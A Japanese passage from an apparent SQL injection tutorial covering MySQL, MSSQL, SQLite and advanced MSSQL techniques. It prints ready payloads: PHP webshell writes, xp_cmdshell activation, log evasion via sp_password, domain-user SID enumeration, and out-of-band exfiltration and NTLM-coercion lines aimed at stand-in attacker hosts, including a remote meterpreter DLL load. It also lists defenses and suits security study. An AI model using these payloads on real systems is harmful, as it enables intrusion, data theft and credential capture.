1. **字句解析層の差**: コメント記号やエスケープ処理の違い。これによりWAF(Web Application Firewall)バイパスの手口も変わる。
2. **カタログ層の差**: テーブル一覧・カラム一覧をどこから読むか(`information_schema` か `sysobjects`/`syscolumns` か `sqlite_master` か)。
3. **機能層の差**: ファイル読み書き、OSコマンド実行、外部ネットワーク通信(DNS/SMB)をSQL経由で行う拡張機能の有無。

この3層構造を意識すると、初見のDBMSでも「まずコメント構文を確認し、次にカタログテーブルを特定し、最後に高権限機能を探す」という定石で攻略できる。

---

### MySQL

> 出典: MySQL Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md

#### コメント構文とバージョン条件付き実行

MySQLは複数のコメント記法を持つ。

```sql
#              -- ハッシュコメント（行末まで）
/* ... */      -- Cスタイルコメント
/*! ... */     -- バージョン条件付き実行コメント
--             -- SQLコメント（直後にスペースが必要）
;%00           -- NULLバイト終端
```

とりわけ `/*!12345 UNION */` のような「バージョン条件付きコメント」がMySQL特有で重要である。数字はMySQLのバージョン番号(例: `50001` は5.0.01以上)を表し、サーバのバージョンがその数値以上であるときだけ、コメント内部のSQLが実行される。通常のコメントとして解釈されるはずの文字列が、MySQLパーサの拡張仕様により条件付きで「コードとして生きる」ため、単純な文字列パターンマッチ型のWAFがコメントとして無視した内容が、実際のMySQLエンジン上では実行されてしまう。これがWAFバイパスの温床になる。

#### 情報スキーマからの列挙

MySQL 5.0以降は `information_schema` データベースが標準搭載され、これがテーブル・カラム列挙の主戦場になる。

```sql
UNION SELECT 1,2,3,GROUP_CONCAT(schema_name) FROM information_schema.schemata
UNION SELECT 1,2,3,GROUP_CONCAT(table_name) FROM information_schema.tables
  WHERE table_schema='database_name'
UNION SELECT 1,2,3,GROUP_CONCAT(column_name) FROM information_schema.columns
  WHERE table_name='target_table'
```

`GROUP_CONCAT()` は複数行の値を1つの文字列にカンマ区切りで連結する集約関数で、UNIONで返せるカラム数が限られていても、この関数を使えば1カラムに何十件ものテーブル名・カラム名を詰め込んで一度に取得できる。ただし `GROUP_CONCAT` の出力にはデフォルトで1,024文字という上限(`group_concat_max_len` システム変数)があり、大量データを抜く際にこの上限が抽出を妨げることがある。

#### information_schema が使えない場合の代替列挙

`information_schema` へのアクセスがWAFやアプリケーション側フィルタで遮断されている場合、MySQL 4.1以降ではカラム名を推測なしに割り出す技がある。

```sql
1 and (1,2,3,4) = (SELECT * from db.users UNION SELECT 1,2,3,4 LIMIT 1)
```

これは、行値式(row constructor) `(1,2,3,4)` と `SELECT * FROM ... UNION SELECT 1,2,3,4` の結果を比較する構文で、比較時に暗黙のカラム型検証が働き、もし `users` テーブルの実カラムに `NOT NULL` 制約があるものが含まれると `Column 'id' cannot be null` のようなエラーメッセージにカラム名がそのまま漏れる。エラーメッセージという「サイドチャネル」を利用してカタログを介さずにスキーマ情報を得る点が特徴である。

またカラム名を伏せたまま値だけを抜く方法として、位置指定でのカラム参照がある。

```sql
SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;
```

サブクエリの中でUNIONされた結果セットは、先頭の `SELECT` リストの別名(この場合は数字リテラルがそのまま列名になる)を継承するため、`4` という「列名」で実際には `USERS` テーブルの4番目のカラムを参照できる。カラム名を一切知らなくても位置だけでデータを抜ける。

#### エラーベース抽出: EXTRACTVALUE / UPDATEXML

MySQLのXML関数 `EXTRACTVALUE()` と `UPDATEXML()` は、第2引数にXPath式を渡す仕様になっているため、不正なXPath文字列を渡すとMySQLがXPath構文エラーを投げ、そのエラーメッセージの中に評価済みのサブクエリ結果が埋め込まれる。

```sql
AND EXTRACTVALUE(1337,CONCAT('~',(SELECT version()),'~'))
AND UPDATEXML(1337,CONCAT('~',(SELECT version()),'~'),31337)
```

`~` はXPathとして不正な文字なので、必ずエラーが発生する。エラーメッセージの中に `CONCAT()` で組み立てた文字列(バージョン文字列を `~` で囲んだもの)がそのまま出力されるため、UNIONが使えない状況でも1回のリクエストでデータを読み出せる。ただしこの手法にはMySQLのバージョンに依存する制約があり、MySQL 5.7.11以降ではXPathエラーメッセージの出力長に上限がかかるようになったため、長い文字列を1回で抜くのは難しくなっている(その場合は `SUBSTRING()` で分割抽出する)。

#### ブラインドインジェクション: 文字列比較とタイミング

出力チャネルが一切なく、真偽値の違いしかレスポンスに現れない場合はブラインド技法を使う。

```sql
?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51
```

`SUBSTR(version(),1,1)` でバージョン文字列の先頭1文字を取り出し、`ASCII()` で数値化して二分探索的に比較する。1文字あたり最大8リクエスト(ASCIIコード0〜255を2進探索)で確定できる。

タイミングベースでは `SLEEP()` 関数を使う。

```sql
AND (SELECT 1 FROM (SELECT(SLEEP(10-(IF(1=1,0,10))))) RANDSTR)
```

条件式が真なら `IF(1=1,0,10)` が0になり `SLEEP(10-0)=SLEEP(10)` で10秒遅延、偽なら `SLEEP(10-10)=SLEEP(0)` で遅延なしとなる。この「条件によってSLEEPの引数を変える」パターンは、レスポンスが常に同じ(エラーも出力差もない)完全ブラインドの状況でも、応答時間という物理的なサイドチャネルさえあれば情報を抜けることを示している。古いMySQL(4/5系)では `BENCHMARK()` 関数(指定回数だけ式を再計算させることでCPU時間を消費させる)も同様の目的で使われた。

#### ファイル読み書きとRCEへの到達

MySQLには `FILE` 権限を持つユーザーであればファイルシステムに直接アクセスできる関数がある。

```sql
UNION ALL SELECT LOAD_FILE('/etc/passwd')--
```

書き込み側は `INTO OUTFILE` / `INTO DUMPFILE` で、Webルート配下にWebシェルを書き込めればRCEに直結する。

```sql
UNION SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "C:\\xampp\\htdocs\\backdoor.php"
```

これが成立する前提は、(1) MySQLプロセスがWebサーバの公開ディレクトリに書き込み権限を持つこと、(2) `--secure-file-priv` システム変数が書き込みを禁止するディレクトリに制限していないこと、の2点である。`secure-file-priv` はMySQL 5.5.53以降デフォルトで有効化される傾向が強まっており、これが設定されている環境では `OUTFILE`/`LOAD_FILE` ともに指定ディレクトリ配下に限定されるため、無条件のRCEは成立しにくくなっている点はバージョン依存の重要な注意点である。

#### 帯域外(OOB)通信によるデータ窃取

UNIONもエラーもブラインドも使えない極端な状況では、MySQLサーバ自身にDNSクエリやSMB通信を発生させて外部にデータを持ち出す。

```sql
SELECT LOAD_FILE(CONCAT('\\\\',VERSION(),'.hacker.site\\a.txt'));
```

Windows上のMySQLが `\\<バージョン文字列>.hacker.site\a.txt` というUNCパスをファイルパスとして解釈しようとする際、まずホスト名解決のためにDNSクエリを発行する。攻撃者が `hacker.site` のDNSサーバを制御していれば、サブドメインとして送られてきた `VERSION()` の値をDNSログから読み取れる。これはアプリケーションのレスポンスを一切必要としない、真の意味での帯域外抽出である。

#### WAFバイパスの発想

MySQL特有のバイパス手法として、指数表記(scientific notation)の悪用がある。

```sql
' or 1.e('') ='
```

`1.e('')` は数値リテラルの指数部として解釈されるため、文字列 `''=` を含む攻撃文字列がWAFの単純な正規表現(`or\s+\d+\s*=\s*\d+` のような典型パターン)に一致しにくくなる。またGBKなどのマルチバイト文字コードを使う環境では、`addslashes()` のようなバックスラッシュエスケープ関数がワイドバイト攻撃で無力化される。`%bf%27` を送ると、アプリ側が `%27`(シングルクォート)の前にバックスラッシュを挿入して `%bf%5c%27` にするが、GBKデコーダは `%bf%5c` を1つの全角文字として解釈してしまい、エスケープ用のバックスラッシュを「食べて」しまう。結果としてエスケープされていない生のシングルクォートがSQL文に残り、インジェクションが成立する。これは文字コード変換層とSQLエスケープ層の間に生じるパーサの不一致を突く典型例である。

---

### MSSQL (Microsoft SQL Server)

> 出典: MSSQL Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md

#### コメント構文とカタログ

MSSQLのコメントは `/* */` と `--` の2種、加えてNULLバイト終端 `;%00` がある。カタログ参照はMySQLの `information_schema` とは別に、SQL Server独自のシステムビューも併用できる。

```sql
SELECT @@version          -- DBMSバージョン
SELECT DB_NAME()          -- 現在のデータベース名
SELECT name FROM master..sysdatabases;      -- データベース一覧
SELECT name FROM <DBNAME>..sysobjects WHERE xtype='U';   -- テーブル一覧
SELECT name FROM syscolumns WHERE id =
  (SELECT id FROM sysobjects WHERE name = 'mytable');     -- カラム一覧
```

`master..sysdatabases` のように「データベース名..システムテーブル名」の2段階ドット記法でデータベースをまたいだ参照ができるのはMSSQL特有のスコープ規則で、これにより現在接続しているデータベース以外のカタログ情報も直接読み出せる。

#### エラーベース: 型変換エラーの悪用

MSSQLは型に厳格で、暗黙変換が失敗すると変換元の値をエラーメッセージにそのまま含める仕様がある。

```sql
AND 1337=CONVERT(INT,(SELECT '~'+(SELECT @@version)+'~')) -- -
```

`CONVERT(INT, 文字列)` は文字列を整数に変換しようとして失敗し、"Conversion failed when converting the varchar value '~Microsoft SQL Server ...~' to data type int" のようなエラーを返す。この挙動はMySQLのXPathエラー抽出と同じ「型検証失敗時にオペランドの実値をログ/エラーに出力してしまう」という設計上の副作用を突く手口であり、DBMSが違っても原理は共通していることが分かる。

#### スタックドクエリ(積み重ねクエリ)

MSSQLの重要な特徴は、多くのドライバ/API経由の接続でセミコロン区切りの複数文(バッチ)をそのまま実行できる点である。

```sql
ProductID=1;waitfor delay '0:0:10'--
ProductID=1; DROP members--
```

MySQLの標準的なWeb接続(`mysqli`/PDO単発クエリなど)では通常1接続1文しか実行できないよう制限されることが多いのに対し、MSSQLはバッチ実行がプロトコルレベルでサポートされているため、`SELECT` 系の脆弱性であっても `;` の後に任意のDML/DDL文(`DROP`, `INSERT`, `EXEC` など)を継ぎ足して実行できてしまう。これはUNIONベースやブラインドより遥かに強力な攻撃面を開くため、MSSQL環境ではスタックドクエリの可否を最初に確認する価値が高い。

#### xp_cmdshell によるOSコマンド実行

MSSQLには拡張ストアドプロシージャという仕組みがあり、その中でも `xp_cmdshell` はOSシェルコマンドをそのまま実行できる。

```sql
EXEC xp_cmdshell "net user";
```

これはSQL Server 2005以降デフォルトで無効化されているが、`sysadmin` ロールを持つ権限があれば `sp_configure` を通じて有効化できる。

```sql
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
```

`sp_configure` は「詳細オプションの表示」を先にオンにしないと `xp_cmdshell` オプション自体が編集対象として見えない、という2段階の防御(デフォルト非表示+デフォルト無効)になっており、これを両方解除して初めてOSコマンド実行に到達できる。つまりMSSQLでのRCEは「SQLインジェクション成立」→「sysadmin権限の確認」→「詳細オプション有効化」→「xp_cmdshell有効化」という複数ステップを要する、比較的重い攻撃チェーンである点がMySQLのOUTFILE直書きRCEとは対照的である。

#### リンクサーバ(Linked Server)を介した横展開

MSSQL特有の機能として、他のSQL Serverインスタンス(あるいは他DBMS)への恒久的な接続を定義できるリンクサーバがある。侵入した1台のMSSQLから、信頼関係のある別サーバへクエリを中継できる。

```sql
select * from master..sysservers                      -- リンクサーバ一覧
select * from openquery("linkedserver", 'select @@version as version')
select 1 from openquery("linkedserver",'select 1;exec master..xp_cmdshell "dir c:"')
```

`openquery()` はリンクサーバ上で実質的に任意のクエリを実行させるパススルー関数であり、リンク先のサーバが `sysadmin` 相当の権限で構成されていれば、侵入したサーバを踏み台にしてリンク先でも `xp_cmdshell` を叩ける。企業ネットワークではバッチ処理やレプリケーションのためにリンクサーバが多段に構成されていることが多く、1つのSQLインジェクションが組織内のDB群全体への横展開の起点になり得る点が、MSSQL環境特有のリスクである。

#### 帯域外抽出とSMBハッシュ窃取

```sql
1'; use master; exec xp_dirtree '\\10.10.10.10\SHARE';--
```

`xp_dirtree` はディレクトリ一覧を取得する拡張ストアドプロシージャだが、引数にUNCパス(ネットワーク共有パス)を渡すと、Windowsの認証機構がSMB接続を試み、攻撃者が用意したリスナーに対してサーバのNTLMハッシュを送信してしまう。これはSQL文の実行結果を使わずに、OS層のファイルアクセス試行そのものを悪用する古典的なテクニックで、後述のSQLiteの `ATTACH DATABASE` 攻撃とは異なる形でOS機能への越境が起きる例である。

#### クレデンシャル抽出とバージョン差

```sql
-- MSSQL 2000 (Hashcatモード131)
SELECT name, password FROM master..sysxlogins
-- MSSQL 2005以降 (Hashcatモード132)
SELECT name, password_hash FROM master.sys.sql_logins
```

MSSQL 2000系と2005以降とでパスワードハッシュの格納テーブルとカラム名、さらにハッシュアルゴリズム自体が変わっている(Hashcatのモード番号が異なる)点は、対象バージョンを特定してから抽出クエリを選ぶ必要があることを示している。

#### ログ回避: sp_password トリック

```sql
' AND 1=1--sp_password
```

`sp_password` という文字列がクエリ末尾に含まれると、SQL Serverはログ記録の際にクエリ本文をそのまま記録せず、"Password not logged" という定型メッセージに置き換える仕様がある(これはストアドプロシージャ `sp_password` 呼び出し時にパスワード文字列がログに残らないようにするための本来の保護機能だが、単なる文字列としてコメント末尾に付与するだけで悪用できる)。攻撃者はこれを使い、注入したクエリの内容が監査ログに残らないようにできる。

---

### SQLite

> 出典: SQLite Injection — https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md

#### コメントとカタログ

SQLiteのコメントは `--` と `/* */` のみとシンプルである。カタログは専用のマスターテーブル `sqlite_master`(新しいバージョンでは互換ビュー `sqlite_schema` も使える)に集約されている。

```sql
select sqlite_version();
SELECT sql FROM sqlite_schema
SELECT tbl_name FROM sqlite_master WHERE type='table'
SELECT GROUP_CONCAT(name) AS column_names FROM pragma_table_info('table_name');
```

MySQLの `information_schema` やMSSQLの `sysobjects` に相当するものが、SQLiteでは単一の `sqlite_master` テーブルに集約されている点が特徴である。さらに興味深いのは `sql` カラムで、これは該当オブジェクトを作成した際の `CREATE TABLE` 文そのものが文字列として保存されており、1回のクエリでテーブル定義(カラム名・型・制約)を丸ごと取得できる。`pragma_table_info()` はSQLiteの `PRAGMA table_info(...)` 文をテーブル値関数として呼び出せるようにしたもので、通常の `SELECT` 文の中に埋め込んで使える点がSQLインジェクションとの相性を良くしている。

#### ブラインド抽出とエラーベースの工夫

SQLiteはMySQLのような専用のエラー抽出関数(EXTRACTVALUE等)を持たないため、条件分岐でエラーを人為的に発生させる。

```sql
AND CASE WHEN [BOOLEAN_QUERY] THEN 1 ELSE load_extension(1) END
```

`load_extension()` は本来、拡張ライブラリをロードするための関数だが、引数に整数のような不正な値(パスとして解釈できない値)を渡すと必ずエラーになる。`CASE WHEN` で条件が偽のときだけこの関数を呼ぶようにしておけば、「エラーが出るかどうか」で真偽値を判定できる。時間ベースでは以下のような乱数変換の反復によって計算コストを稼ぐ手法が使われる。

```sql
AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
```

SQLiteには `SLEEP()` に相当する組み込み関数が存在しないため、代わりに `RANDOMBLOB()`(指定バイト数のランダムなバイナリを生成する関数)に巨大なバイト数を渡し、その変換・比較処理自体にCPU時間を消費させて疑似的な時間遅延を作り出している。これはDBMSに直接的なスリープ機構がない場合の一般的な回避策であり、「重い計算を条件分岐の一方にだけ仕込む」という発想はどのDBMSでも応用できる。

#### ATTACH DATABASE を用いたRCE

SQLite特有かつ最も強力な攻撃がこれである。SQLiteはサーバー型DBMSと異なり、データベース自体が1つのファイルであり、`ATTACH DATABASE` 文を使うと任意のパスに新しいSQLiteデータベースファイルを作成・接続できる。

```sql
ATTACH DATABASE '/var/www/shell.php' AS shell;
CREATE TABLE shell.pwn (dataz text);
INSERT INTO shell.pwn (dataz) VALUES ('<?php system($_GET["cmd"]); ?>');--
```

これが機能する理由は2つのゆるさの組み合わせにある。第一に、SQLiteは指定されたパスに書き込み権限さえあれば、拡張子やファイルの既存有無を問わずファイルを作成してしまう。第二に、生成されるファイルの先頭にはSQLiteのマジックヘッダ(`SQLite format 3\0` という16バイトの固定文字列)が付与されるが、PHPのインタプリタは`<?php`タグさえファイル中のどこかに現れれば、それより前にどんなバイナリのゴミが存在しても無視して実行してしまうという寛容な仕様を持つ。この2点が重なることで、「PHPとして解釈されるファイルを、Web公開ディレクトリ内に作る」というRCEが成立する。書き込み先を `/etc/cron.d/` のようなcron設定ディレクトリに変えれば、root権限で動くcronジョブへの昇格も理論上可能になる。

#### load_extension による拡張ロード

```sql
SELECT load_extension('\\evilhost\evilshare\meterpreter.dll','DllMain');
```

SQLiteは外部の共有ライブラリ(Linuxなら `.so`、Windowsなら `.dll`)を動的にロードし、指定した初期化関数を呼び出せる `load_extension()` 機能を持つ。これはデフォルトでは無効化されている(アプリケーション側が明示的に `sqlite3_enable_load_extension()` を呼んでいる場合のみ有効)が、有効な環境ではネットワーク越しの共有パスから任意のネイティブコードをロードさせることができ、ATTACH DATABASE経由のWebシェルよりもさらに直接的なコード実行経路になる。

#### ファイルI/Oの制約

SQLiteは標準では組み込みのファイル読み取り関数(MySQLの `LOAD_FILE()` に相当するもの)を持たない。書き込み側には `writefile()` 関数があるが、これはSQLite拡張(`fileio` 拡張モジュール)が有効化されている場合のみ使用可能であり、デフォルトのビルドには含まれないことが多い点に注意が必要である。つまりSQLite環境での攻撃の主軸は「ファイルI/O関数の直接悪用」ではなく、上述の `ATTACH DATABASE` による間接的なファイル生成にある。

---

### DBMS横断で押さえるべき共通の考え方

3つのDBMSを比較すると、攻撃者の思考プロセスには共通のパターンがあることが分かる。

- **カタログの場所を最初に特定する**: MySQLは `information_schema`、MSSQLは `sysobjects`/`sys.*`、SQLiteは `sqlite_master`。この一手だけでも大半の列挙作業は完了する。
- **エラーメッセージは常に「型変換失敗時に元の値を漏らす」設計上の副作用を突ける**: MySQLのXPath関数、MSSQLの`CONVERT`、SQLiteの`CASE WHEN`+`load_extension`は、いずれも「本来の目的の関数を、意図的にエラーを起こすためだけに流用する」という同じ発想の異なる実装である。
- **RCEへの到達経路はDBMSの設計思想を反映する**: MySQLはファイルシステムへの直接書き込み(`OUTFILE`)、MSSQLは拡張ストアドプロシージャ(`xp_cmdshell`)、SQLiteはデータベース自体がファイルであることを悪用した`ATTACH DATABASE`。いずれも「SQL実行権限を、OSレベルの権限に変換する」ための、そのDBMS固有の橋渡し機能を狙っている。
- **帯域外通信はネットワーク層のプロトコル挙動を悪用する**: MySQLのUNCパス経由DNS解決、MSSQLの`xp_dirtree`によるSMB認証誘発は、いずれもSQL文の実行結果ではなく、OSのネットワーククライアントが自動的に行う名前解決や認証の副作用を情報チャネルとして利用している。

### 防御側の要点

これらの手法はいずれも、パラメータ化クエリ(プリペアドステートメント)を徹底すれば入口の時点で無効化できる。加えて、実運用では次の多層防御が有効である。

- データベースアカウントを最小権限化し、Webアプリ用アカウントには `FILE` 権限(MySQL)、`sysadmin`/`ADMINISTER BULK OPERATIONS`(MSSQL)、拡張ロード権限(SQLite)を付与しない。
- MySQLでは `secure-file-priv` を明示的に設定し、任意パスへの `OUTFILE`/`LOAD_FILE` を禁止する。
- MSSQLでは `xp_cmdshell` を無効化したまま維持し、リンクサーバは必要最小限かつ低権限のセキュリティコンテキストで構成する。
- SQLiteを組み込むアプリケーションでは `sqlite3_enable_load_extension()` を呼ばず、DB接続プロセスにWebルート等の書き込み権限を与えない。
- WAFは単純な文字列パターンだけでなく、`/*!...*/` のようなバージョン条件付きコメントや指数表記・マルチバイト文字によるバイパスを想定したルールを備える。

これらの原則は個々のペイロードを暗記することよりも重要であり、新しいDBMSやバージョンに遭遇した際にも「コメント構文→カタログ→高権限機能→OOB経路」という同じ探索順序を適用することで、体系的に攻撃面を評価できる。

## HackTricks高度なMSSQL/MS Access

本節では、Microsoft SQL Server（MSSQL）とMicrosoft Access（Jet/ACEデータベースエンジン）を対象とした、実務で有用な高度なSQLインジェクション技法をまとめる。前者はエンタープライズ向けRDBMSとしてActive Directory環境に深く統合されている点が攻撃面を広げており、後者はレガシーな組み込みデータベース（.mdb/.accdb）でありながら、Classic ASPアプリケーションなどで今なお現役の攻撃対象として遭遇する。両者とも「その製品特有の関数・演算子・エラー挙動」をどう悪用するかが核心であり、汎用のUNIONベースSQLiの知識だけでは太刀打ちできない場面が多い。

### MSSQL: ドメインユーザーの列挙

MSSQLはActive Directory統合認証（Windows認証）を前提に運用されることが多く、SQLインジェクションを起点にドメインのユーザー一覧を割り出せる場合がある。鍵となるのは次の3つの組み込み関数である。

- `SELECT DEFAULT_DOMAIN()` — 現在のドメイン名を取得する。
- `master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))` — 指定したドメインユーザー（ここでは`Administrator`）のSID（セキュリティ識別子）を16進文字列で返す。
- `SUSER_SNAME(0x...)` — 逆に、SIDを与えるとユーザー名を返す。

なぜこれが列挙に使えるのか。WindowsのSIDは`ドメインID + RID（相対識別子）`という構造を持つ。`Administrator`アカウントのRIDは常に`500`固定であり、これはWindowsのセキュリティモデル上の予約値である。したがって`SUSER_SID('DOMAIN\Administrator')`の返り値をhex化すると、末尾4バイト（リトルエンディアンで解釈すれば`500`）を除いた残りのバイト列が、そのドメインに固有の「ドメインID」だとわかる。

```python
def get_sid(n):
	domain = '0x0105000000000005150000001c00d1bcd181f1492bdfc236'
	user = struct.pack('<I', int(n))
	user = user.hex()
	return f"{domain}{user}" #if n=1000, get SID of the user with ID 1000
```

このドメインIDを固定し、RID部分だけをリトルエンディアンでパックして末尾に連結すれば、任意のRIDに対応するSIDを合成できる。一般ユーザーのRIDは通常1000から採番が始まるため、1000〜2000程度の範囲をブルートフォースし、それぞれのSIDを`SUSER_SNAME()`に渡してユーザー名が返るかを確認すれば、ドメイン内の実在ユーザーを大量に洗い出せる。これはSQLインジェクションの脆弱性をActive Directoryの偵察（reconnaissance）フェーズに転用する典型例であり、後続のパスワードスプレー攻撃やASREPRoast等の標的リスト作成に直結する。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### エラーベース注入の代替ベクタ（WAF回避）

典型的なエラーベースSQLiは`+AND+1=@@version--`のような、型変換エラーを強制的に発生させて結果をエラーメッセージに反映させる手法だが、この構文パターンはWAF（Web Application Firewall）のシグネチャに引っかかりやすい。回避策として、`%2b`（URLエンコードされた`+`、文字列連結演算子）を使い、型変換エラーを誘発する関数呼び出しの結果を連結する。

利用できる関数の例:

- `SUSER_NAME()`
- `USER_NAME()`
- `PERMISSIONS()`
- `DB_NAME()`
- `FILE_NAME()`
- `TYPE_NAME()`
- `COL_NAME()`

```
https://vuln.app/getItem?id=1'%2buser_name(@@version)--
```

なぜ動くのか。これらの関数は本来`nvarchar`等の文字列型を返すが、注入先が数値コンテキストなど別の型として扱われる箇所であれば、文字列と数値の暗黙変換に失敗しエラーが発生する。そのエラーメッセージにはしばしば「変換できなかった値」そのものが含まれるため、`user_name(@@version)`のように関数の引数にダンプしたい値（この例では`@@version`、サーバーのバージョン文字列）を仕込むことで、エラーメッセージ経由で値をリークできる。単純な`AND 1=@@version`という構文をブロックするWAFのルールを、関数呼び出し形式に言い換えることで迂回する狙いである。

> 出典: MSSQL Injection — https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection

### SSRF/OOB（帯域外）を狙う関数群

MSSQLには、UNC（Universal Naming Convention、`\\host\share`形式）パスやURLを引数に取り、外部ホストへアクセスする組み込み関数・ストアドプロシージャが多数存在する。これらは元来運用管理用途だが、攻撃者が制御するリスナー（DNSやSMB、HTTPのキャプチャサーバー）へアクセスさせることで、SSRF（Server-Side Request Forgery、サーバーに攻撃者指定のリクエストを強制する脆弱性）やOOBデータ抽出（クエリの戻り値を直接読めない場合に、DNSやSMBの副作用でデータを外部に持ち出す手法）を実現できる。

#### `fn_xe_file_target_read_file`

Extended Events（拡張イベント）のファイルターゲットを読む関数。SQL Server 2019以前では`VIEW SERVER STATE`権限が必要、2022以降は`VIEW SERVER PERFORMANCE STATE`（データベーススコープでは`VIEW DATABASE PERFORMANCE STATE`）に細分化された点に注意する。Azure SQL Database/Managed Instanceでは`https://`のBlob URLを読む仕様に変わっているため、従来の`\\attacker\...`によるオンプレ向けOOBトリックは主にオンプレSQL Serverでのみ有効である。

```
https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
```

第2引数のUNCパスにサブクエリで取得した機密値（ここでは`pass`カラム）をホスト名の一部として連結している。SQL Serverがこのパスへアクセスしようとする際、名前解決のためにDNSクエリが飛ぶ。攻撃者がBurp Collaboratorのような外部リスナーを制御していれば、そのDNSクエリのサブドメイン部分（=漏洩させたい値）をログから読み取れる。これはHTTPレスポンスに値が直接出ない「ブラインド」な状況でも機能する強力な抽出経路である。

権限の有無は次のクエリで確認できる。

```sql
# Check if you have it
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name IN ('VIEW SERVER STATE', 'VIEW SERVER PERFORMANCE STATE');
SELECT * FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name='VIEW DATABASE PERFORMANCE STATE';
# Or doing
Use master;
EXEC sp_helprotect 'fn_xe_file_target_read_file';
```

#### `fn_get_audit_file`

サーバー監査ログを読む関数。2019以前は`CONTROL SERVER`（実質的にサーバー全体の管理者権限）が必要だが、2022以降は`VIEW SERVER SECURITY AUDIT`権限のみで読めるよう緩和された。

```
https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
```

原理は`fn_xe_file_target_read_file`と同じで、監査ログファイルの読み込み先としてUNCパスを指定させ、そのDNS解決を悪用してデータを持ち出す。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name IN ('CONTROL SERVER', 'VIEW SERVER SECURITY AUDIT');
Use master;
EXEC sp_helprotect 'fn_get_audit_file';
```

#### `fn_trace_gettable`

SQLトレースファイル（`.trc`）を読み込む関数で、`CONTROL SERVER`権限が必要。同様にUNCパスのDNS解決を悪用する。

```sql
https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
```

#### `xp_dirtree` / `xp_fileexist` / `xp_subdirs`

Microsoft公式にはドキュメント化されていない拡張ストアドプロシージャ群だが、ネットワーク共有への操作用途で古くから知られ、OOBデータ抽出の定番として使われてきた。`xp_dirtree`はネットワーク要求を発生させるが、**TCP 445番ポート固定**（SMB用）でありポート変更はできない。

```sql
DECLARE @user varchar(100);
SELECT @user = (SELECT user);
EXEC ('master..xp_dirtree "\\' + @user + '.attacker-server\\aa"');
```

これは値を取得したいカラム（例では`user`）を変数に格納し、それをホスト名の一部として組み立てたUNCパスへ`xp_dirtree`でアクセスさせている。SMB接続の試行（多くの場合DNS解決を伴う）がそのまま帯域外チャネルになる。ただし、SQL Server 2019 RTM + Windows Server 2016のデフォルト構成など、環境によっては動作しないケースが報告されている点に留意する必要がある。`xp_fileexist`や`xp_subdirs`も同種の目的で代替として使える。

#### `OPENROWSET(BULK...)` と `BULK INSERT`

スタックドクエリ（1つの注入ポイントで複数文を連続実行できる状況）とバルク権限がある場合、`OPENROWSET(BULK...)`はローカルファイルの読み取りと、攻撃者制御のUNCパスへのアクセスの両方に使える強力な手段である。特にSQL Server認証（Windows認証ではなくSQLログイン）でログインしている場合、リモートファイルアクセスは**SQL Serverサービスアカウントのセキュリティコンテキスト**で実行される。これはつまり、単にファイルを読むだけでなく、サービスアカウントのNetNTLM認証情報を攻撃者側へリーク（あるいはリレー中継）させられることを意味する。

```sql
-- Read a local file
SELECT * FROM OPENROWSET(BULK N'C:/Windows/win.ini', SINGLE_CLOB) AS x;

-- Error-based variant
https://vuln.app/getItem?id=1+and+1=(select+x+from+OpenRowset(BULK+'C:/Windows/win.ini',SINGLE_CLOB)+R(x))--

-- SMB/UNC coercion
CREATE TABLE #TEXTFILE (column1 NVARCHAR(100));
BULK INSERT #TEXTFILE FROM '\\attacker\share\file';
DROP TABLE #TEXTFILE;
```

権限確認は以下で行う。

```sql
SELECT * FROM fn_my_permissions(NULL, 'SERVER') WHERE permission_name='ADMINISTER BULK OPERATIONS';
SELECT * FROM fn_my_permissions(NULL, 'DATABASE') WHERE permission_name='ADMINISTER DATABASE BULK OPERATIONS';
SELECT IS_SRVROLEMEMBER('bulkadmin');
```

Azure SQL Database/Managed Instanceではバルクプロバイダの入力元がBlob/URIベースに変わっているため、オンプレ特有のSMBトリックはクラシックなオンプレSQL Server環境で主に有効という点も押さえておく。

レガシー環境（SQL Server 2008世代など）では、`BACKUP ... TO DISK='\\attacker\file'`や`RESTORE ... FROM DISK='\\attacker\file'`がUNCパスを**認可チェックより前に解決してしまう**という設計上の欠陥があり、これも同種のNTLM窃取・ファイル操作の原始的な手法として悪用可能だった。ただし2016年のセキュリティ更新（MS16-136）でこの挙動は修正されているため、サポート対象バージョンでは通用しない、古いビルド固有の手法として理解しておく。

#### `sys.dm_os_enumerate_filesystem` / `sys.dm_os_file_exists`

`xp_dirtree`や`xp_fileexist`が権限剥奪（revoke）されて使えない環境でも、動的管理関数（DMF: Dynamic Management Function）である`sys.dm_os_enumerate_filesystem`や`sys.dm_os_file_exists`を使うと、SQL Serverサービスアカウントに強制的にSMB認証を行わせられる（さらにファイルシステムのメタデータまで取得できる場合もある）ことが近年の研究で示されている。

```sql
SELECT * FROM sys.dm_os_enumerate_filesystem('\\attacker\share', '*');
SELECT * FROM sys.dm_os_file_exists('\\attacker\share\file');
```

権限エラーが出た場合は、現在のコンテキストで以下のようなVIEW STATE系権限を先に確認すると良い。

```sql
